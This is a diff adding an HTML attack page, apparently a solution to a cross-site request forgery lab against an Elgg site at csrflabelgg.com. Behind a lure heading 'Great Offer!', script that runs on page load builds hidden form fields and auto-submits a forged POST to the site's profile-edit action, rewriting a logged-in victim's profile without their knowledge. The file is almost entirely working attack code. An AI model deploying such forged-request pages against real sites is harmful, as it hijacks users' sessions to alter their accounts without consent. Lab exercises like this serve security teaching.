@@ -1,0 +1,32 @@
+<html>
+<body>
+<h1>Great Offer!</h1>
+<script type="text/javascript">
+function forge_post()
+{
+    var fields;
+    //The following are form entries that need to be filled out by attackers. 
+    // The entries are hidden, so the victim won't be able to see them.
+    fields += "<input type='hidden' name='name' value='Alice'>";
+    fields += "<input type='hidden' name='description' value=''>";
+    fields += "<input type='hidden' name='accesslevel[descrption]' value='2'>";
+    fields += "<input type='hidden' name='briefdescription' value='Boby is my hero!'>"; 
+    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+    fields += "<input type='hidden' name='location' value=''>";
+    fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+    fields += "<input type='hidden' name='guid' value='42'>";
+    // Create a <form> element.
+    var p = document.createElement("form");
+    // Construct the form
+    p.action="http://www.csrflabelgg.com/action/profile/edit";
+    p.innerHTML = fields;
+    p.method = "post";
+    // Append the form to the current page.
+    document.body.appendChild(p);
+    // Submit the form
+    p.submit(); 
+}
+window.onload=function() { forge_post(); }
+</script>
+</body>
+</html>
